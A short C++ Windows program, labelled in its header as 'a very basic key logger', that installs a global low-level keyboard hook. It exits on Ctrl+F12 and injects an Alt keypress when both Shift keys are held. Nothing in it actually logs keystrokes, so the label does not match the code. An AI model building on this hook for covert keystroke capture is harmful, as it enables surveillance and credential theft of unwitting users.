/************************************************************
* A very basic Key logger in C++
* Author: Manish
************************************************************/

// Include header files
#include <Windows.h>
#include <stdio.h>

// Initialize a keyboard HHOOK
HHOOK KeyboardHook;

// The WIN API Message Loop
void KeepAlive()
{
    MSG message;
    while (GetMessage(&message, NULL, 0, 0))
    {
        TranslateMessage(&message);
        DispatchMessage(&message);
    }
}

// Unhook and exit
void Exit()
{
    UnhookWindowsHookEx(KeyboardHook);
    exit(0);
}

// Callback function to be hooked
LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    bool bControlKeyDown = 0;
    // Get current state of capsLock
    bool caps = GetKeyState(VK_CAPITAL) < 0;
    KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
    if (nCode == HC_ACTION) {
        // Check if F12 + CTRL is pressed, if yes -> exit
        bControlKeyDown = GetAsyncKeyState(VK_CONTROL) >> ((sizeof(SHORT) * 8) - 1);
        if (p->vkCode == VK_F12 && bControlKeyDown) // If F12 and CTRL are pressed
        {
            Exit();
        }

        if (
            wParam == WM_KEYDOWN &&
            (
                (p->vkCode == VK_LSHIFT && (GetAsyncKeyState(VK_RSHIFT) >> ((sizeof(SHORT) * 8) - 1))) ||
                (p->vkCode == VK_RSHIFT && (GetAsyncKeyState(VK_LSHIFT) >> ((sizeof(SHORT) * 8) - 1)))
                )
            ) {
            keybd_event(VK_LMENU, 0, 0, 0);
            keybd_event(VK_LMENU, 0, KEYEVENTF_KEYUP, 0);
        }
    }
    // Forward the event to other hooks
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// WinAPI main method
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
    // Hook to all available threads
    KeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboardHookProc, hInstance, NULL);
    if (KeyboardHook != NULL)
    {
        // Keep alive till F12 + CTRL key press is detected - can also register Hotkey
        KeepAlive();
    }
    // Exit the program
    return 0;
}
